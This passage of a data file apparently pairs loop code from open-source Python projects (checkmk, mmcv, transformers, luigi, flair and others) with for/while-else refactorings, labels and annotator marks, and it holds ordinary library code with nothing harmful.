                                    node_durations_and_run_times.get(tuple(next_node.path()), [0, 0])[0])))

                        elif isinstance(next_node, pipelines.ParallelTask):
                            # create sub tasks and queue them
                            task_start_time = datetime.datetime.now(tz.utc)
                            try:
                                logger.redirect_output(event_queue, next_node.path())
                                logger.log('☆ Launching tasks', format=logger.Format.ITALICS)
                                sub_pipeline = next_node.launch()
                                next_node.parent.replace(next_node, sub_pipeline)
                                queue([sub_pipeline])

                            except Exception as e:
                                event_queue.put(pipeline_events.NodeStarted(
                                    node_path=next_node.path(), start_time=task_start_time, is_pipeline=True))
                                logger.log(message=f'Could not launch parallel tasks', format=logger.Format.ITALICS,
                                           is_error=True)
                                logger.log(message=traceback.format_exc(),
                                           format=pipeline_events.Output.Format.VERBATIM, is_error=True)
                                event_queue.put(pipeline_events.NodeFinished(
                                    node_path=next_node.path(), start_time=task_start_time,
                                    end_time=datetime.datetime.now(tz.utc), is_pipeline=True, succeeded=False))

                                failed_pipelines.add(next_node.parent)
                                processed_nodes.add(next_node)
                            finally:
                                logger.redirect_output(event_queue, pipeline.path())

                        else:
                            # run a task in a subprocess
                            if next_node.parent in running_pipelines:
                                running_pipelines[next_node.parent][1] += 1
                            event_queue.put(
                                pipeline_events.NodeStarted(next_node.path(), datetime.datetime.now(tz.utc), False))
                            event_queue.put(pipeline_events.Output(
                                node_path=next_node.path(), format=logger.Format.ITALICS,
                                message='★ ' + node_cost.format_duration(
                                    node_durations_and_run_times.get(tuple(next_node.path()), [0, 0])[0])))

                            process = TaskProcess(next_node, event_queue, multiprocessing_context)
                            process.start()
                            running_task_processes[next_node] = process

                # check whether some of the running processes finished
                for task_process in list(running_task_processes.values()):  # type: TaskProcess
                    if task_process.is_alive():
                        pass
                    else:
                        del running_task_processes[task_process.task]
                        if task_process.task.parent in running_pipelines:
                            running_pipelines[task_process.task.parent][1] -= 1

                        processed_nodes.add(task_process.task)

                        if not task_process.succeeded and not task_process.task.parent.ignore_errors:
                            for parent in task_process.task.parents()[:-1]:
                                failed_pipelines.add(parent)

                        end_time = datetime.datetime.now(tz.utc)
                        event_queue.put(
                            pipeline_events.Output(task_process.task.path(),
                                                   ('succeeded' if task_process.succeeded else 'failed') + ',  '
                                                   + logger.format_time_difference(task_process.start_time, end_time),
                                                   format=logger.Format.ITALICS, is_error=not task_process.succeeded))
                        event_queue.put(pipeline_events.NodeFinished(task_process.task.path(), task_process.start_time,
                                                                     end_time, False, task_process.succeeded))

                # check if some pipelines finished
                track_finished_pipelines()

                # don't busy-wait
                time.sleep(0.001)

        except:
            event_queue.put(pipeline_events.Output(node_path=pipeline.path(), message=traceback.format_exc(),
                                                   format=logger.Format.ITALICS, is_error=True))

        # run again because `dequeue` might have moved more nodes to `finished_nodes`
        track_finished_pipelines()

        if statistics_process:
            # kill the stats process (joining or terminating does not work in gunicorn)
            os.kill(statistics_process.pid, signal.SIGKILL)
            statistics_process.join()

        # run finished
        event_queue.put(pipeline_events.RunFinished(node_path=pipeline.path(), end_time=datetime.datetime.now(tz.utc),
                                                    succeeded=not failed_pipelines,
                                                    interactively_started=interactively_started))","while parent:
    if parent in failed_pipelines and (not parent.force_run_all_children):
        processed_nodes.add(node)
        processed_as_parent_failed = True
        break
    else:
        parent = parent.parent
if not processed_as_parent_failed:
    return node","while parent:
    if parent in failed_pipelines and (not parent.force_run_all_children):
        processed_nodes.add(node)
        break
    else:
        parent = parent.parent
else:
    return node","while parent:
    if parent in failed_pipelines and (not parent.force_run_all_children):
        processed_nodes.add(node)
        break
    else:
        parent = parent.parent
else:
    return node",1,"while parent:
    if parent in failed_pipelines and (not parent.force_run_all_children):
        processed_nodes.add(node)
        processed_as_parent_failed = True
        break
    else:
        parent = parent.parent
if not processed_as_parent_failed:
    return node","break statement is executed:None
break statement is not executed:zejun1"
BlenderProc,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/BlenderProc/blenderproc/python/material/MaterialLoaderUtility.py,https://github.com/DLR-RM/BlenderProc/tree/master/blenderproc/python/material/MaterialLoaderUtility.py,,change_to_texture_less_render$473,"def change_to_texture_less_render(use_alpha_channel):
    """""" Changes the materials, which do not contain a emission shader to a white slightly glossy texture

    :param use_alpha_channel: If true, the alpha channel stored in .png textures is used.
    """"""
    new_mat = bpy.data.materials.new(name=""TextureLess"")
    new_mat.use_nodes = True
    nodes = new_mat.node_tree.nodes

    principled_bsdf = Utility.get_the_one_node_with_type(nodes, ""BsdfPrincipled"")

    # setting the color values for the shader
    principled_bsdf.inputs['Specular'].default_value = 0.65  # specular
    principled_bsdf.inputs['Roughness'].default_value = 0.2  # roughness

    for used_object in [obj for obj in bpy.context.scene.objects if hasattr(obj.data, 'materials')]:
        # replace all materials with the new texture less material
        for slot in used_object.material_slots:
            emission_shader = False
            # check if the material contains an emission shader:
            for node in slot.material.node_tree.nodes:
                # check if one of the shader nodes is a Emission Shader
                if 'Emission' in node.bl_idname:
                    emission_shader = True
                    break
            # only replace materials, which do not contain any emission shader
            if not emission_shader:
                if use_alpha_channel:
                    slot.material = add_alpha_texture_node(slot.material, new_mat)
                else:
                    slot.material = new_mat","for node in slot.material.node_tree.nodes:
    if 'Emission' in node.bl_idname:
        emission_shader = True
        break
if not emission_shader:
    if use_alpha_channel:
        slot.material = add_alpha_texture_node(slot.material, new_mat)
    else:
        slot.material = new_mat","for node in slot.material.node_tree.nodes:
    if 'Emission' in node.bl_idname:
        break
else:
    if use_alpha_channel:
        slot.material = add_alpha_texture_node(slot.material, new_mat)
    else:
        slot.material = new_mat","for node in slot.material.node_tree.nodes:
    if 'Emission' in node.bl_idname:
        break
else:
    if use_alpha_channel:
        slot.material = add_alpha_texture_node(slot.material, new_mat)
    else:
        slot.material = new_mat",1,"for node in slot.material.node_tree.nodes:
    if 'Emission' in node.bl_idname:
        emission_shader = True
        break
if not emission_shader:
    if use_alpha_channel:
        slot.material = add_alpha_texture_node(slot.material, new_mat)
    else:
        slot.material = new_mat","break statement is executed:None
break statement is not executed:zejun1"
checkmk,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/checkmk/cmk/gui/plugins/views/layouts.py,https://github.com/tribe29/checkmk/tree/master/cmk/gui/plugins/views/layouts.py,LayoutMatrix,csv_export$751,"def csv_export(self, rows, view, group_cells, cells):
        output_csv_headers(view)

        groups, unique_row_ids, matrix_cells = list(
            create_matrices(rows, group_cells, cells, num_columns=None)
        )[0]
        value_counts, _row_majorities = self._matrix_find_majorities(rows, cells)

        painter_options = PainterOptions.get_instance()
        with table_element(output_format=""csv"") as table:
            for cell_nr, cell in enumerate(group_cells):
                table.row()
                table.cell("""", cell.title(use_short=False))
                for _group, group_row in groups:
                    _tdclass, content = cell.render(group_row)
                    table.cell("""", content)

            for rid in unique_row_ids:
                # Omit rows where all cells have the same values
                if painter_options.get(""matrix_omit_uniform""):
                    at_least_one_different = False
                    for counts in value_counts[rid].values():
                        if len(counts) > 1:
                            at_least_one_different = True
                            break
                    if not at_least_one_different:
                        continue

                table.row()
                _tdclass, content = cells[0].render(list(matrix_cells[rid].values())[0])
                table.cell("""", content)

                for group_id, group_row in groups:
                    table.cell("""")
                    cell_row = matrix_cells[rid].get(group_id)
                    if cell_row is not None:
                        for cell_nr, cell in enumerate(cells[1:]):
                            _tdclass, content = cell.render(cell_row)
                            if cell_nr:
                                html.write_text("","")
                            html.write_text(content)","for counts in value_counts[rid].values():
    if len(counts) > 1:
        at_least_one_different = True
        break
if not at_least_one_different:
    continue","for counts in value_counts[rid].values():
    if len(counts) > 1:
        break
else:
    continue","for counts in value_counts[rid].values():
    if len(counts) > 1:
        break
else:
    continue",1,"for counts in value_counts[rid].values():
    if len(counts) > 1:
        at_least_one_different = True
        break
if not at_least_one_different:
    continue","break statement is executed:None
break statement is not executed:zejun1"
mmcv,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/mmcv/mmcv/runner/base_runner.py,https://github.com/open-mmlab/mmcv/tree/master/mmcv/runner/base_runner.py,BaseRunner,register_hook$255,"def register_hook(self, hook, priority='NORMAL'):
        """"""Register a hook into the hook list.

        The hook will be inserted into a priority queue, with the specified
        priority (See :class:`Priority` for details of priorities).
        For hooks with the same priority, they will be triggered in the same
        order as they are registered.

        Args:
            hook (:obj:`Hook`): The hook to be registered.
            priority (int or str or :obj:`Priority`): Hook priority.
                Lower value means higher priority.
        """"""
        assert isinstance(hook, Hook)
        if hasattr(hook, 'priority'):
            raise ValueError('""priority"" is a reserved attribute for hooks')
        priority = get_priority(priority)
        hook.priority = priority
        # insert the hook to a sorted list
        inserted = False
        for i in range(len(self._hooks) - 1, -1, -1):
            if priority >= self._hooks[i].priority:
                self._hooks.insert(i + 1, hook)
                inserted = True
                break
        if not inserted:
            self._hooks.insert(0, hook)","for i in range(len(self._hooks) - 1, -1, -1):
    if priority >= self._hooks[i].priority:
        self._hooks.insert(i + 1, hook)
        inserted = True
        break
if not inserted:
    self._hooks.insert(0, hook)","for i in range(len(self._hooks) - 1, -1, -1):
    if priority >= self._hooks[i].priority:
        self._hooks.insert(i + 1, hook)
        break
else:
    self._hooks.insert(0, hook)","for i in range(len(self._hooks) - 1, -1, -1):
    if priority >= self._hooks[i].priority:
        self._hooks.insert(i + 1, hook)
        break
else:
    self._hooks.insert(0, hook)",1,"for i in range(len(self._hooks) - 1, -1, -1):
    if priority >= self._hooks[i].priority:
        self._hooks.insert(i + 1, hook)
        inserted = True
        break
if not inserted:
    self._hooks.insert(0, hook)","break statement is executed:None
break statement is not executed:zejun1"
transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/transformers/src/transformers/models/layoutlm/tokenization_layoutlm.py,https://github.com/huggingface/transformers/tree/master/src/transformers/models/layoutlm/tokenization_layoutlm.py,WordpieceTokenizer,tokenize$468,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through *BasicTokenizer*.

        Returns:
            A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/transformers/src/transformers/models/layoutlm/tokenization_layoutlm.py,https://github.com/huggingface/transformers/tree/master/src/transformers/models/layoutlm/tokenization_layoutlm.py,WordpieceTokenizer,tokenize$468,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through *BasicTokenizer*.

        Returns:
            A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
luigi,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/luigi/test/visualiser/visualiser_test.py,https://github.com/spotify/luigi/tree/master/test/visualiser/visualiser_test.py,TestVisualiser,test$66,"def test(self):
        port = self.get_http_port()
        print('Server port is {}'.format(port))
        print('Starting phantomjs')

        p = subprocess.Popen('phantomjs {}/phantomjs_test.js http://localhost:{}'.format(here, port),
                             shell=True, stdin=None)

        # PhantomJS may hang on an error so poll
        status = None
        for x in range(TEST_TIMEOUT):
            status = p.poll()
            if status is not None:
                break
            time.sleep(1)

        if status is None:
            raise AssertionError('PhantomJS failed to complete')
        else:
            print('PhantomJS return status is {}'.format(status))
            assert status == 0","for x in range(TEST_TIMEOUT):
    status = p.poll()
    if status is not None:
        break
    time.sleep(1)
if status is None:
    raise AssertionError('PhantomJS failed to complete')
else:
    print('PhantomJS return status is {}'.format(status))
    assert status == 0","for x in range(TEST_TIMEOUT):
    status = p.poll()
    if status is not None:
        print('PhantomJS return status is {}'.format(status))
        assert status == 0
        break
    time.sleep(1)
else:
    raise AssertionError('PhantomJS failed to complete')","for x in range(TEST_TIMEOUT):
    status = p.poll()
    if status is not None:
        print('PhantomJS return status is {}'.format(status))
        assert status == 0
        break
    time.sleep(1)
else:
    raise AssertionError('PhantomJS failed to complete')",1,"for x in range(TEST_TIMEOUT):
    status = p.poll()
    if status is not None:
        break
    time.sleep(1)
if status is None:
    raise AssertionError('PhantomJS failed to complete')
else:
    print('PhantomJS return status is {}'.format(status))
    assert status == 0","break statement is executed:None
break statement is not executed:zejun1"
programmingbitcoin,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/programmingbitcoin/code-ch06/op.py,https://github.com/jimmysong/programmingbitcoin/tree/master/code-ch06/op.py,,op_if$150,"def op_if(stack, items):
    if len(stack) < 1:
        return False
    # go through and re-make the items array based on the top stack element
    true_items = []
    false_items = []
    current_array = true_items
    found = False
    num_endifs_needed = 1
    while len(items) > 0:
        item = items.pop(0)
        if item in (99, 100):
            # nested if, we have to go another endif
            num_endifs_needed += 1
            current_array.append(item)
        elif num_endifs_needed == 1 and item == 103:
            current_array = false_items
        elif item == 104:
            if num_endifs_needed == 1:
                found = True
                break
            else:
                num_endifs_needed -= 1
                current_array.append(item)
        else:
            current_array.append(item)
    if not found:
        return False
    element = stack.pop()
    if decode_num(element) == 0:
        items[:0] = false_items
    else:
        items[:0] = true_items
    return True","while len(items) > 0:
    item = items.pop(0)
    if item in (99, 100):
        num_endifs_needed += 1
        current_array.append(item)
    elif num_endifs_needed == 1 and item == 103:
        current_array = false_items
    elif item == 104:
        if num_endifs_needed == 1:
            found = True
            break
        else:
            num_endifs_needed -= 1
            current_array.append(item)
    else:
        current_array.append(item)
if not found:
    return False","while len(items) > 0:
    item = items.pop(0)
    if item in (99, 100):
        num_endifs_needed += 1
        current_array.append(item)
    elif num_endifs_needed == 1 and item == 103:
        current_array = false_items
    elif item == 104:
        if num_endifs_needed == 1:
            break
        else:
            num_endifs_needed -= 1
            current_array.append(item)
    else:
        current_array.append(item)
else:
    return False","while len(items) > 0:
    item = items.pop(0)
    if item in (99, 100):
        num_endifs_needed += 1
        current_array.append(item)
    elif num_endifs_needed == 1 and item == 103:
        current_array = false_items
    elif item == 104:
        if num_endifs_needed == 1:
            break
        else:
            num_endifs_needed -= 1
            current_array.append(item)
    else:
        current_array.append(item)
else:
    return False",1,"while len(items) > 0:
    item = items.pop(0)
    if item in (99, 100):
        num_endifs_needed += 1
        current_array.append(item)
    elif num_endifs_needed == 1 and item == 103:
        current_array = false_items
    elif item == 104:
        if num_endifs_needed == 1:
            found = True
            break
        else:
            num_endifs_needed -= 1
            current_array.append(item)
    else:
        current_array.append(item)
if not found:
    return False","break statement is executed:None
break statement is not executed:zejun1"
flair,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/flair/flair/models/sequence_tagger_model.py,https://github.com/flairNLP/flair/tree/master/flair/models/sequence_tagger_model.py,MultiTagger,load$1144,"def load(cls, model_names: Union[List[str], str]):
        if model_names == ""hunflair-paper"":
            model_names = [
                ""hunflair-paper-cellline"",
                ""hunflair-paper-chemical"",
                ""hunflair-paper-disease"",
                ""hunflair-paper-gene"",
                ""hunflair-paper-species"",
            ]
        elif model_names == ""hunflair"" or model_names == ""bioner"":
            model_names = [
                ""hunflair-cellline"",
                ""hunflair-chemical"",
                ""hunflair-disease"",
                ""hunflair-gene"",
                ""hunflair-species"",
            ]
        elif isinstance(model_names, str):
            model_names = [model_names]

        taggers = {}
        models: List[SequenceTagger] = []

        # load each model
        for model_name in model_names:

            model = SequenceTagger.load(model_name)

            # check if the same embeddings were already loaded previously
            # if the model uses StackedEmbedding, make a new stack with previous objects
            if type(model.embeddings) == StackedEmbeddings:

                # sort embeddings by key alphabetically
                new_stack = []
                d = model.embeddings.get_named_embeddings_dict()
                import collections

                od = collections.OrderedDict(sorted(d.items()))

                for k, embedding in od.items():

                    # check previous embeddings and add if found
                    embedding_found = False
                    for previous_model in models:

                        # only re-use static embeddings
                        if not embedding.static_embeddings:
                            continue

                        if embedding.name in previous_model.embeddings.get_named_embeddings_dict():
                            previous_embedding = previous_model.embeddings.get_named_embeddings_dict()[embedding.name]
                            previous_embedding.name = previous_embedding.name[2:]
                            new_stack.append(previous_embedding)
                            embedding_found = True
                            break

                    # if not found, use existing embedding
                    if not embedding_found:
                        embedding.name = embedding.name[2:]
                        new_stack.append(embedding)

                # initialize new stack
                model.embeddings = None
                model.embeddings = StackedEmbeddings(new_stack)

            else:
                # of the model uses regular embedding, re-load if previous version found
                if not model.embeddings.static_embeddings:

                    for previous_model in models:
                        if model.embeddings.name in previous_model.embeddings.get_named_embeddings_dict():
                            previous_embedding = previous_model.embeddings.get_named_embeddings_dict()[
                                model.embeddings.name
                            ]
                            if not previous_embedding.static_embeddings:
                                model.embeddings = previous_embedding
                                break

            taggers[model_name] = model
            models.append(model)

        return cls(taggers)","for previous_model in models:
    if not embedding.static_embeddings:
        continue
    if embedding.name in previous_model.embeddings.get_named_embeddings_dict():
        previous_embedding = previous_model.embeddings.get_named_embeddings_dict()[embedding.name]
        previous_embedding.name = previous_embedding.name[2:]
        new_stack.append(previous_embedding)
        embedding_found = True
        break
if not embedding_found:
    embedding.name = embedding.name[2:]
    new_stack.append(embedding)","for previous_model in models:
    if not embedding.static_embeddings:
        continue
    if embedding.name in previous_model.embeddings.get_named_embeddings_dict():
        previous_embedding = previous_model.embeddings.get_named_embeddings_dict()[embedding.name]
        previous_embedding.name = previous_embedding.name[2:]
        new_stack.append(previous_embedding)
        break
else:
    embedding.name = embedding.name[2:]
    new_stack.append(embedding)","for previous_model in models:
    if not embedding.static_embeddings:
        continue
    if embedding.name in previous_model.embeddings.get_named_embeddings_dict():
        previous_embedding = previous_model.embeddings.get_named_embeddings_dict()[embedding.name]
        previous_embedding.name = previous_embedding.name[2:]
        new_stack.append(previous_embedding)
        break
else:
    embedding.name = embedding.name[2:]
    new_stack.append(embedding)",1,"for previous_model in models:
    if not embedding.static_embeddings:
        continue
    if embedding.name in previous_model.embeddings.get_named_embeddings_dict():
        previous_embedding = previous_model.embeddings.get_named_embeddings_dict()[embedding.name]
        previous_embedding.name = previous_embedding.name[2:]
        new_stack.append(previous_embedding)
        embedding_found = True
        break
if not embedding_found:
    embedding.name = embedding.name[2:]
    new_stack.append(embedding)","break statement is executed:None
break statement is not executed:zejun1"
pytorch-toolbelt,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pytorch-toolbelt/pytorch_toolbelt/optimization/functional.py,https://github.com/BloodAxe/pytorch-toolbelt/tree/master/pytorch_toolbelt/optimization/functional.py,,get_lr_decay_parameters$7,"def get_lr_decay_parameters(model: nn.Module, learning_rate: float, lr_multipliers: Dict[str, float]):
    """"""
    Create different parameter groups with different settings.

    Args:
        parameters:
        learning_rate:
        groups: {""encoder"": 0.1 ,""encoder.layer2"": 0.2}
    """"""
    custom_lr_parameters = dict(
        (group_name, {""params"": [], ""lr"": learning_rate * lr_factor})
        for (group_name, lr_factor) in lr_multipliers.items()
    )
    custom_lr_parameters[""default""] = {""params"": [], ""lr"": learning_rate}

    for parameter_name, parameter in model.named_parameters():
        if not parameter.requires_grad:
            continue

        matches = False
        for group_name, lr in lr_multipliers.items():
            if str.startswith(parameter_name, group_name):
                custom_lr_parameters[group_name][""params""].append(parameter)
                matches = True
                break

        if not matches:
            custom_lr_parameters[""default""][""params""].append(parameter)

    return list(custom_lr_parameters.values())","for (group_name, lr) in lr_multipliers.items():
    if str.startswith(parameter_name, group_name):
        custom_lr_parameters[group_name]['params'].append(parameter)
        matches = True
        break
if not matches:
    custom_lr_parameters['default']['params'].append(parameter)","for (group_name, lr) in lr_multipliers.items():
    if str.startswith(parameter_name, group_name):
        custom_lr_parameters[group_name]['params'].append(parameter)
        break
else:
    custom_lr_parameters['default']['params'].append(parameter)","for (group_name, lr) in lr_multipliers.items():
    if str.startswith(parameter_name, group_name):
        custom_lr_parameters[group_name]['params'].append(parameter)
        break
else:
    custom_lr_parameters['default']['params'].append(parameter)",1,"for (group_name, lr) in lr_multipliers.items():
    if str.startswith(parameter_name, group_name):
        custom_lr_parameters[group_name]['params'].append(parameter)
        matches = True
        break
if not matches:
    custom_lr_parameters['default']['params'].append(parameter)","break statement is executed:None
break statement is not executed:zejun1"
algobot,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/algobot/algobot/threads/volatility_snooper_thread.py,https://github.com/ZENALC/algobot/tree/master/algobot/threads/volatility_snooper_thread.py,VolatilitySnooperThread,snoop$107,"def snoop(self):
        """"""
        Run snooper functionality.
        """"""
        self.validate()
        self.signals.activity.emit('Starting the volatility snooper...')
        volatility_dict = {}
        for index, ticker in enumerate(self.tickers):
            if not self.running:
                break

            self.signals.activity.emit(f""Gathering volatility for {ticker}..."")
            self.signals.progress.emit(int(index / len(self.tickers) * 100))

            data = self.binance_client.get_historical_klines(ticker, self.short_interval, self.get_starting_timestamp())
            data_length = len(data)

            multiplier = 2
            impossible = False

            while len(data) < self.periods + 1:
                starting_timestamp = self.get_starting_timestamp(multiplier=multiplier)
                data = self.binance_client.get_historical_klines(ticker, self.short_interval, starting_timestamp)
                multiplier += 1

                if len(data) == data_length:
                    impossible = True
                    break

                data_length = len(data)

            if impossible:
                volatility_dict[ticker] = ""Not enough data. Maybe the ticker is too new.""
            else:
                data = [get_normalized_data(d) for d in data]
                volatility_dict[ticker] = self.volatility_func(periods=self.periods, data=data)

        return volatility_dict","while len(data) < self.periods + 1:
    starting_timestamp = self.get_starting_timestamp(multiplier=multiplier)
    data = self.binance_client.get_historical_klines(ticker, self.short_interval, starting_timestamp)
    multiplier += 1
    if len(data) == data_length:
        impossible = True
        break
    data_length = len(data)
if impossible:
    volatility_dict[ticker] = 'Not enough data. Maybe the ticker is too new.'
else:
    data = [get_normalized_data(d) for d in data]
    volatility_dict[ticker] = self.volatility_func(periods=self.periods, data=data)","while len(data) < self.periods + 1:
    starting_timestamp = self.get_starting_timestamp(multiplier=multiplier)
    data = self.binance_client.get_historical_klines(ticker, self.short_interval, starting_timestamp)
    multiplier += 1
    if len(data) == data_length:
        volatility_dict[ticker] = 'Not enough data. Maybe the ticker is too new.'
        break
    data_length = len(data)
else:
    data = [get_normalized_data(d) for d in data]
    volatility_dict[ticker] = self.volatility_func(periods=self.periods, data=data)","while len(data) < self.periods + 1:
    starting_timestamp = self.get_starting_timestamp(multiplier=multiplier)
    data = self.binance_client.get_historical_klines(ticker, self.short_interval, starting_timestamp)
    multiplier += 1
    if len(data) == data_length:
        volatility_dict[ticker] = 'Not enough data. Maybe the ticker is too new.'
        break
    data_length = len(data)
else:
    data = [get_normalized_data(d) for d in data]
    volatility_dict[ticker] = self.volatility_func(periods=self.periods, data=data)",1,"while len(data) < self.periods + 1:
    starting_timestamp = self.get_starting_timestamp(multiplier=multiplier)
    data = self.binance_client.get_historical_klines(ticker, self.short_interval, starting_timestamp)
    multiplier += 1
    if len(data) == data_length:
        impossible = True
        break
    data_length = len(data)
if impossible:
    volatility_dict[ticker] = 'Not enough data. Maybe the ticker is too new.'
else:
    data = [get_normalized_data(d) for d in data]
    volatility_dict[ticker] = self.volatility_func(periods=self.periods, data=data)","break statement is executed:zejun1
break statement is not executed:None"
R-Drop,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/R-Drop/huggingface_transformer_src/src/transformers/models/tapas/tokenization_tapas.py,https://github.com/dropreg/R-Drop/tree/master/huggingface_transformer_src/src/transformers/models/tapas/tokenization_tapas.py,WordpieceTokenizer,tokenize$2120,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, :obj:`input = ""unaffable""` wil return as output :obj:`[""un"", ""##aff"", ""##able""]`.

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer`.

        Returns:
          A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
R-Drop,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/R-Drop/huggingface_transformer_src/src/transformers/models/tapas/tokenization_tapas.py,https://github.com/dropreg/R-Drop/tree/master/huggingface_transformer_src/src/transformers/models/tapas/tokenization_tapas.py,WordpieceTokenizer,tokenize$2120,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

